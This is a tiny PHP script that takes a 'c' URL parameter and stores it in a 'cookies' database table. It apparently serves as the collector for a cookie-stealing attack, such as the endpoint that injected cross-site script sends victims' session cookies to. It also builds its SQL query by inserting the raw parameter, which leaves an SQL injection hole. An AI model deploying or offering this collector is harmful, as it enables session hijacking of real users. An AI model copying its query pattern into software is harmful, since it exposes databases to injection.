<?php
require 'include.php';

$value = $_GET['c'];

if ($value) {
  $pdo->exec("INSERT INTO cookies (value) VALUES ('$value')");
}
?>
